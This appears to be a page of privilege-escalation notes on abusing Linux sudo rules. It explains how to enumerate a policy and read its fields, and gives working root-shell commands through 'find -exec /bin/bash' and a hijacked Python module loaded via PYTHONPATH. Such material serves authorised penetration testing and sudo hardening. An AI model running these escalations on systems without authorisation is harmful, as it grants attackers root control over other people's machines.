# Sudo rules and command behavior

## Discover the policy
```bash
id
sudo -V | head -n 1
sudo -n -l
sudo -ll
```
- `-n` never prompts: a password error does not mean no rules. Retry `sudo -l` with a known password.
- Unprivileged `sudo -V` shows less than root would see.

Resolve and read what a rule points at:
```bash
command -v find python3 tar
ls -l /usr/bin/find /usr/bin/python3
namei -l <SCRIPT>
sed -n '1,160p' <SCRIPT>
```
- Use the exact paths from the policy: a familiar name may be a custom wrapper or fixed-argument call.

## Read each field
```text
Matching Defaults entries for <USER> on <HOST>:
    env_reset, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User <USER> may run the following commands on <HOST>:
    (root) NOPASSWD: /usr/bin/find
    (backup) /usr/bin/tar -cf /var/backups/home.tar /home/<USER>
    (root) NOPASSWD: SETENV: /usr/bin/python3 <SCRIPT>
```

| Field | Meaning |
| --- | --- |
| `(root)`, `(backup)`, `(ALL : ALL)` | Allowed run-as user/group: pick with `-u` / `-g` |
| `NOPASSWD` / `PASSWD` | Per command; tags can change within a list |
| No arguments after the binary | Any arguments allowed; `""` = none |
| Fixed args / wildcards / regex | Wildcards span spaces and `/`; anchored regex needs sudo ≥ 1.9.10 |
| `env_reset`, `env_keep` | Which inherited variables survive |
| `SETENV` / `NOSETENV` | Whether you may set variables on the command line |
| `secure_path` | PATH the command runs with |
| `NOEXEC`, `INTERCEPT` | May block child processes |
| `sudoedit` | Runs the editor as you, installs the file as the target |

## Match behavior to permission
| Program does | Next |
| --- | --- |
| Runs another command/interpreter/editor/pager | Does the permitted argument set expose it; child keeps run-as identity? (GTFOBins) |
| Reads caller-chosen file | Read a protected file |
| Writes caller-chosen file | Overwrite vs append, destination mode → [file-write](file-write.md) |
| Runs a fixed script | Imports, config, helpers, working dir, writable deps → [root-run](root-run.md) |
| `sudoedit` | Which file; which privileged process consumes it |

## Command runner with free arguments (find)
```bash
sudo -u root -l /usr/bin/find . -maxdepth 0 -exec /usr/bin/id \;
sudo -u root /usr/bin/find . -maxdepth 0 -exec /usr/bin/id \;
sudo -u root /usr/bin/find . -maxdepth 0 -exec /bin/bash \;
```
- First line only checks the invocation against the policy. Output `uid=0(root)` = works.
- Exact-argument rule: adding `-exec` fails to match.

## Python script with SETENV (PYTHONPATH)
Rule: `(root) NOPASSWD: SETENV: /usr/bin/python3 <SCRIPT>`; script does `import <MODULE>` and no earlier path has it.

```bash
d=$(mktemp -d)
cat > "$d/<MODULE>.py" <<'PY'
import os
os.system("/bin/bash")
PY
sudo -u root PYTHONPATH="$d" PYTHONDONTWRITEBYTECODE=1 /usr/bin/python3 <SCRIPT>
```
- Check the real module name and the function the script calls.
- Script's own directory beats `PYTHONPATH`; `-E`/`-I` in the rule ignores it.
- Proof-only variant: replace the shell line with `print(os.getuid(), os.geteuid())`.

## Environment, LD_PRELOAD, sudoedit
- `sudo VAR=value cmd` ≠ `export VAR=value; sudo cmd`; `env_reset` drops most, `sudo -E` is not unrestricted.
- `LD_PRELOAD`/`LD_LIBRARY_PATH` are stripped for setuid execution and by secure execution.
- `sudoedit`: editor shell escapes run as YOU, not root. Default `sudoedit_checkdir` refuses symlinks/writable directories.
- Kernel/package CVE → [kernel-checks](kernel-checks.md).

## Failed path
| Result | Check |
| --- | --- |
| Password/terminal required | `NOPASSWD` must apply to this exact command |
| Command not allowed | Run-as user, resolved path, exact arguments, exclusions |
| Env assignment rejected | `SETENV`/`NOSETENV` |
| Original Python output | Script dir precedence, `-E`/`-I`, path changes in the script |
| Child command denied | `NOEXEC`, `INTERCEPT`, child path |
| Non-root identity | That account's access and rules are a separate step |
| Root inside a container | Not host root → [groups-and-nfs](groups-and-nfs.md) |
